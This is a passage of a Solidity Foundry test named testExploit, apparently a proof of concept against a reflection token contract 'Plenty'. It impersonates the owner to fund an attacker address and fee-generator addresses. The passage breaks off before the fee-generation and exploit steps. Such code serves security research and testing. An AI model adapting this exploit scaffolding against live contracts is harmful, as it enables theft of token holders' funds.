    function testExploit() public {
        uint256 initialBalance = IPlenty(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // First, we need to get tokens through proper transfer to set up reflection accounting
        // Let's find the owner address
        address owner = IPlenty(TARGET).owner();
        console.log("Contract owner:", owner);

        // Impersonate owner to transfer tokens to attacker
        vm.startPrank(owner);
        // Transfer enough tokens to attacker
        IPlenty(TARGET).transfer(attacker, requiredTokens * 3);
        // Transfer tokens to fee generators
        IPlenty(TARGET).transfer(feeGen1, requiredTokens * 10);
        IPlenty(TARGET).transfer(feeGen2, requiredTokens * 10);
        vm.stopPrank();

        console.log("Attacker balance after receiving tokens:", IPlenty(TARGET).balanceOf(attacker));

        // Generate fees by transferring between feeGen addresses
